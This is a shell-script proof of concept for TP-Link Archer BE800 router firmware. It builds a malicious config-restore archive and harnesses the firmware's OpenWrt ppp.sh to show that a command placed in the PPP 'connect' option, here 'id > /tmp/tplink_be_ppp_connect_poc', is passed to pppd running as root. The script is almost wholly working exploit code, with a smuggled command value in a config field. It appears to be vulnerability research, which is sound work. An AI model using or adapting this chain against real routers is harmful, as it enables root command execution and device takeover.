#!/bin/sh
set -e

SRC="${1:-gpl_focus/GPL_Archer_BE800v1/qca_95xx_12_1/package/network/services/ppp/files/ppp.sh}"

WORK="${TMPDIR:-/tmp}/tplink_be_restore_ppp_connect_chain_$$"
ARCHIVE="$WORK/restore_ppp_connect_poc.tgz"
ROOT="$WORK/root"
PAYLOAD="$WORK/payload"
PPPSH="$WORK/ppp.sh"
HARNESS="$WORK/harness.sh"
ARGV="$WORK/pppd.argv"

rm -rf "$WORK"
mkdir -p "$ROOT" "$PAYLOAD/etc/config"

cat > "$PAYLOAD/etc/config/network" <<'EOF'
config interface 'pocppp'
	option proto 'ppp'
	option device '/dev/null'
	option username 'poc'
	option password 'poc'
	option connect 'id > /tmp/tplink_be_ppp_connect_poc'
EOF

(cd "$PAYLOAD" && tar -czf "$ARCHIVE" etc/config/network)
tar -xzC "$ROOT" -f "$ARCHIVE"

test -f "$ROOT/etc/config/network"
grep -q "option proto 'ppp'" "$ROOT/etc/config/network"
grep -q "option connect 'id > /tmp/tplink_be_ppp_connect_poc'" "$ROOT/etc/config/network"

# Source-semantics harness for TP-Link/OpenWrt ppp.sh:
# - keep the original ppp_generic_setup() implementation
# - stub netifd helpers
# - capture the exact argv that would be passed to root pppd
sed 's/^\[ -x \/usr\/sbin\/pppd \] || exit 0$/:/' "$SRC" > "$PPPSH"

cat > "$HARNESS" <<EOF
#!/bin/sh
set -e
INCLUDE_ONLY=1
. "$PPPSH"

proto_run_command() {
	: > "$ARGV"
	for arg in "\$@"; do
		printf '%s\n' "\$arg" >> "$ARGV"
	done
}

json_get_vars() { :; }
json_get_var() {
	eval "\$1=\\\${\$2-}"
}
proto_add_host_dependency() { :; }
network_get_subnets() { :; }
proto_block_restart() { :; }

username=poc
password=poc
connect='id > /tmp/tplink_be_ppp_connect_poc'
keepalive='5 1'
persist=0
maxfail=1
pppd_options=

ppp_generic_setup pocppp /dev/null
EOF
chmod 0755 "$HARNESS"
sh "$HARNESS"

grep -qx '/usr/sbin/pppd' "$ARGV"
grep -qx 'connect' "$ARGV"
grep -qx 'id > /tmp/tplink_be_ppp_connect_poc' "$ARGV"

echo "archive=$ARCHIVE"
echo "root=$ROOT"
echo "wrote=$ROOT/etc/config/network"
echo "captured_pppd_argv=$ARGV"
sha256sum "$ARCHIVE"
